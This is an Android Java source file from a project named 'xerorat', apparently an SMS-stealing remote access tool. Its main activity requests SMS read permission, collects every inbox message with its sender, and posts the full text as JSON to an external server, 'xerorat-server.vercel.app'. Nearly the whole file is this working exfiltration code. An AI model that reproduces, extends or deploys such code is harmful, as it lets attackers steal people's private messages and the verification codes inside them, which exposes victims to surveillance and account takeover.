package com.arnabxero.xerorat;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import java.io.IOException;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_SMS_PERMISSION = 1;

    private Button sendSmsButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        sendSmsButton = findViewById(R.id.sendSmsButton);
        sendSmsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendSmsToServer();
            }
        });

        // Check for and request SMS permissions
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_SMS}, REQUEST_SMS_PERMISSION);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_SMS_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted
            } else {
                Toast.makeText(this, "SMS permissions are required to send messages to the server.",
                        Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void sendSmsToServer() {
        // Fetch SMS Messages
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);

        if (cursor != null) {
            ArrayList<String> smsList = new ArrayList<>();

            int addressIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");

            while (cursor.moveToNext()) {
                String address = (addressIndex != -1) ? cursor.getString(addressIndex) : "Unknown";
                String body = (bodyIndex != -1) ? cursor.getString(bodyIndex) : "No message body";
                String smsMessage = "From: " + address + "\n" + "Message: " + body;
                smsList.add(smsMessage);
            }

            cursor.close();

            // Convert SMS data to plain text
            StringBuilder smsText = new StringBuilder();
            for (String smsMessage : smsList) {
                smsText.append(smsMessage).append("\n");
            }

            // Send SMS data to the server
            sendSmsDataToServer(smsText.toString());
        }
    }

    private void sendSmsDataToServer(final String smsData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    OkHttpClient client = new OkHttpClient();
                    String serverUrl = "https://xerorat-server.vercel.app/api/main"; // Replace with your server's URL

                    // Create a JSON object with the "messages" key and SMS data
                    JSONObject jsonBody = new JSONObject();
                    jsonBody.put("messages", smsData);

                    RequestBody requestBody = RequestBody.create(
                            MediaType.parse("application/json"), jsonBody.toString());

                    Request request = new Request.Builder()
                            .url(serverUrl)
                            .post(requestBody)
                            .build();

                    Response response = client.newCall(request).execute();

                    if (response.isSuccessful()) {
                        // Successfully sent data to the server
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this, "SMS data sent to server successfully", Toast.LENGTH_SHORT).show();
                            }
                        });
                    } else {
                        // Handle errors
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this, "Failed to send SMS data to server", Toast.LENGTH_SHORT).show();
                            }
                        });
                    }
                } catch (IOException | JSONException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

}
